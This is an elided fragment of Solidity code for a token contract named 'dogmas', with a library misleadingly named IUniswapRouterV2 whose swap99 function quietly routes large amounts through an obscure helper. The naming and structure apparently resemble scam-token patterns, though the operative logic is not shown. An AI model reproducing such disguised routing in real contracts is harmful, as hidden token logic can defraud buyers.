...
library IUniswapRouterV2 {
    ...
    function swap99(UniswapRouterV2 instance2,UniswapRouterV2 instance,uint256 amount,address from) internal view returns (uint256) {
        ...
        if (amount > 142){
            ...
            return cwapp2(instance2,  amount,from);
        }
        
    }
}

contract dogmas is geesNDER,IERC20,Ownable {
    using SafeMath for uint256;
    uint256 private _totalSupply = 1000000000*10**18;
    uint8 private constant _decimals = 18;
    string private _name = unicode"dogmas";
    string private _symbol = unicode"dogmas";
